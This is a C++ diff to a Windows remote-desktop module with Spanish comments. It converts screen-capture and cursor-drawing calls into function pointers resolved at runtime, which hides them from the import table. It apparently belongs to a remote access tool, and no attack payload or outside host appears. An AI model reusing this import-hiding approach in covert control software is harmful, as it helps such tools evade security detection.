@@ -231,17 +231,23 @@ mod_RemoteDesktop::mod_RemoteDesktop(HMODULE _user32DLL) {
     this->hOle32 = wrapLoadDLL("ole32.dll");
 
     if (this->hUser32DLL) {
-        this->USER32.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
-        this->USER32.pGetDC = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
-        this->USER32.pGetDesktopWindow = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
+        this->USER32.pSendInput           = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
+        this->USER32.pGetDC               = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
+        this->USER32.pGetDesktopWindow    = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
         this->USER32.pEnumDisplayMonitors = (st_User32_RD::LPENUMDISPLAYMONITORS)wrapGetProcAddr(this->hUser32DLL, "EnumDisplayMonitors");
-        this->USER32.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
+        this->USER32.pGetMonitorInfoA     = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
+        this->USER32.pGetCursorInfo       = (st_User32_RD::LPGETCURSORINFO)wrapGetProcAddr(this->hUser32DLL, "GetCursorInfo");
+        this->USER32.pGetIconInfo         = (st_User32_RD::LPGETICONINFO)wrapGetProcAddr(this->hUser32DLL, "GetIconInfo");
+        this->USER32.pDrawIconEx          = (st_User32_RD::LPDRAWICONEX)wrapGetProcAddr(this->hUser32DLL, "DrawIconEx");
+        this->USER32.pGetWindowRect       = (st_User32_RD::LPGETWINDOWRECT)wrapGetProcAddr(this->hUser32DLL, "GetWindowRect");
+
     }
 
     if (this->hGdi32DLL) {
         this->GDI32.pCreateCompatibleDC = (st_Gdi32::LPCREATECOMPATIBLEDC)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleDC");
         this->GDI32.pCreateCompatibleBitmap = (st_Gdi32::LPCREATECOMPATIBLEBITMAP)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleBitmap");
         this->GDI32.pSelectObject = (st_Gdi32::LPSELECTOBJECT)wrapGetProcAddr(this->hGdi32DLL, "SelectObject");
+        this->GDI32.pGetObjectA = (st_Gdi32::LPGETOBJECTA)wrapGetProcAddr(this->hGdi32DLL, "GetObjectA");
         this->GDI32.pBitBlt = (st_Gdi32::LPBITBLT)wrapGetProcAddr(this->hGdi32DLL, "BitBlt");
     }
 
@@ -283,7 +289,8 @@ std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality
     std::shared_ptr<Gdiplus::Bitmap> outBitmap = nullptr;
 
     if (!this->GDI32.pCreateCompatibleBitmap || !this->GDI32.pCreateCompatibleDC ||
-        !this->GDI32.pSelectObject || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal) {
+        !this->GDI32.pSelectObject || !this->GDI32.pGetObjectA || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal ||
+        !this->USER32.pGetWindowRect) {
         return outBitmap;
     }
 
@@ -357,14 +364,19 @@ std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality
 
     //Si esta habilitado mostrar el mouse
     if (this->m_Vmouse()) {
-        GetCursorInfo(&cursor);
-        if (cursor.flags == CURSOR_SHOWING) {
-            GetWindowRect(hDesktopWnd, &cursorRect);
-            GetIconInfo(cursor.hCursor, &info);
-            cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
-            cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
-            GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
-            DrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
+        if (this->USER32.pGetCursorInfo != nullptr &&
+            this->USER32.pGetIconInfo != nullptr &&
+            this->USER32.pDrawIconEx != nullptr) {
+            
+            this->USER32.pGetCursorInfo(&cursor);
+            if (cursor.flags == CURSOR_SHOWING) {
+                this->USER32.pGetWindowRect(hDesktopWnd, &cursorRect);
+                this->USER32.pGetIconInfo(cursor.hCursor, &info);
+                cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
+                cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
+                this->GDI32.pGetObjectA(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
+                this->USER32.pDrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
+            }
         }
     }
 
@@ -440,7 +452,7 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(std::shared_ptr<Gdiplus::Bit
         goto EndSec;
     }
 
-    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
+    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
         __DBG_("CreateStreamOnHGlobal error\n");
         goto EndSec;
